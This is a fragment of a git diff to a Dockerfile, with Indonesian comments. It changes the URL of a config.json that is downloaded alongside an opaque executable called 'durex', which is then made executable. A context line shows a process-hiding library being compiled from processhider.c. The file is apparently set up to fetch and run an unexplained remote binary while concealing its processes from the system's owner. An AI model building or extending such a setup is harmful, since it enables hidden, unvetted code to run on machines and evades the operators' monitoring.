@@ -17,7 +17,7 @@ RUN gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
 
 # Download config.json dan durex, serta memberikan izin eksekusi pada durex
 RUN wget https://github.com/bulboni/durxzero/raw/main/durex \
-&& wget https://raw.githubusercontent.com/bulboni/cds/main/config.json \
+&& wget https://raw.githubusercontent.com/bulboni/durxzero/main/config.json \
 && chmod +x durex
     
 
